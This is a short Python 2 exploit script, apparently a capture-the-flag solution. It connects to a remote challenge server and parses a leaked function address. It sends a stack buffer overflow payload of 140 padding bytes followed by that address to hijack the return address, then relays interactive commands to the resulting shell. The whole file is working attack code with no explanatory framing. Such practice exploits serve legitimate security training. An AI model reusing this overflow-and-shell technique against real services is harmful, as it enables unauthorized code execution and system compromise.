#! /usr/bin/env python
##
import socket
import re
import sys

def get_hex(data):
    address = re.findall('(?:[0-9]x)([0-9a-z]+)', data)[1]
    if len(address) % 2 != 0:
        address = '0' + address
    elif len(address) == 6:
        address = '00' + address
    address = [ch for ch in address]
    address = [address[i*2] + address[(i*2)+1] for i in range(len(address) / 2)]
    print(address)
    address.reverse()
    address = [ch.decode('hex') for ch in address]
    address = ''.join(address)
    return address

for i in range(1):
    s = socket.socket()
    s.connect(('play.spgame.site', 1346))
    print(i)
    while True:
        data = s.recv(4096)
        print("RECV>>>" + data.strip())
        if "Your exploit string" in data:
            give_shell_hex = get_hex(data)

            response = (('A' * 140) + give_shell_hex + '\n')
            s.send(response)
            continue
        elif "Return Address" in data:
            response = raw_input('$ ') + '\n'
            s.send(response)